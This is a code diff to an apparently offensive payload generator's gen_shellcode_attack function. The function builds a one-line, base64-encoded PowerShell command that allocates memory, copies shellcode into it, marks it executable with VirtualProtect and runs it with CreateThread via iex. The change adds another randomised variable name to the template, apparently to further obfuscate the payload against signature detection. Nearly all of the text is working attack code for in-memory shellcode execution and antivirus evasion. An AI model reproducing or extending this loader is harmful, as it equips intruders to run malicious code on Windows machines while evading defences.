@@ -902,10 +902,11 @@ def gen_shellcode_attack(payload, ipaddr, port):
             reroll = True
         varcheck = varcheck + var16
 
-        #var17 = generate_random_string(3,3) # $dllimport
-        #if var17.lower() in varcheck.lower():
-        #    reroll = True
-        #varcheck = varcheck + var17
+
+        var17 = "$" + generate_random_string(3,3) # $yyyy
+        if var17.lower() in varcheck.lower():
+            reroll = True
+        varcheck = varcheck + var17
 
         var18 = generate_random_string(3,3) # $Win32
         if var18.lower() in varcheck.lower():
@@ -958,13 +959,16 @@ def gen_shellcode_attack(payload, ipaddr, port):
     syswowsplit_2 = generate_random_string(3,4)
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr calloc(uint dwSize, uint amount);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$zzzz="%s";$wwww=Add-Type -pass -m $tttt -Name "%s" -names $Win32;$wwww=$wwww.replace("$Win32", "%s");[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","$randomized_byte_namex").replace("$randomized_byte_name", "0").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, [int][int]0x$randstack, 0x40, [Ref]$tempvar);$wwww::CreateThread(0,0x00,$xxxx,0,0,0);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";$5555 = "C:\$4444\$syswowsplit_1$syswowsplit_2\$4444$2222\v1.0\$2222";$5555 = $5555.replace("$syswowsplit_1", "sys");$5555 = $5555.replace("$syswowsplit_2", "wow64");$$truevalue = '%s';if([environment]::Is64BitOperatingSystem -eq '$$truevalue'){$2222= $5555};$fullcommand=" $2222 $noexit $hhhh";$fullcommand=$fullcommand.replace("$noexit", "-noexit -e");iex $fullcommand''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,shellcode,randomize_service_name,Win32,true_mangle)).replace("SHELLCODE_STUB", mangle_shellcode)
+    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr calloc(uint dwSize, uint amount);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$zzzz="%s";$wwww=Add-Type -pass -m $tttt -Name "%s" -names $Win32;$wwww=$wwww.replace("$Win32", "%s");[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","$randomized_byte_namex").replace("$randomized_byte_name", "0").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, 0x$randstack, 0x40, [Ref]$tempvar);$yyyy=[int]0x00;$wwww::CreateThread(0,$yyyy,$xxxx,0,0,0);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";$5555 = "C:\$4444\$syswowsplit_1$syswowsplit_2\$4444$2222\v1.0\$2222";$5555 = $5555.replace("$syswowsplit_1", "sys");$5555 = $5555.replace("$syswowsplit_2", "wow64");$$truevalue = '%s';if([environment]::Is64BitOperatingSystem -eq '$$truevalue'){$2222= $5555};$fullcommand=" $2222 $noexit $hhhh";$fullcommand=$fullcommand.replace("$noexit", "-noexit -e");iex $fullcommand''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,shellcode,randomize_service_name,Win32,true_mangle)).replace("SHELLCODE_STUB", mangle_shellcode)
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
         "$2222", var3).replace("$3333", var4).replace("$xxxx", var5).replace("$tttt", var6).replace(
         "$hhhh", var7).replace("$zzzz", var8).replace("$gggg", var9).replace("$iiii", var10).replace(
-        "$wwww", var11).replace("$randstack", var12).replace("$4444", var13).replace("$tempvar", var15).replace("$Win32", var18).replace("$randomized_byte_name", randomized_byte_name).replace("$fullcommand", "$" + full_command).replace("$5555", "$" + syswow_var).replace("$noexit", noexit).replace("$truevalue", truevalue).replace("$syswowsplit_1", syswowsplit_1).replace("$syswowsplit_2", syswowsplit_2)
+        "$wwww", var11).replace("$randstack", var12).replace("$4444", var13).replace("$tempvar", var15).replace(
+        "$yyyy", var17).replace("$Win32", var18).replace("$randomized_byte_name", randomized_byte_name).replace(
+        "$fullcommand", "$" + full_command).replace("$5555", "$" + syswow_var).replace("$noexit", noexit).replace(
+        "$truevalue", truevalue).replace("$syswowsplit_1", syswowsplit_1).replace("$syswowsplit_2", syswowsplit_2)
 
     # if we have PRINT_DECODED="ON" this will spit out the raw powershell code for you
     if PRINT_DECODED.lower() == "on":
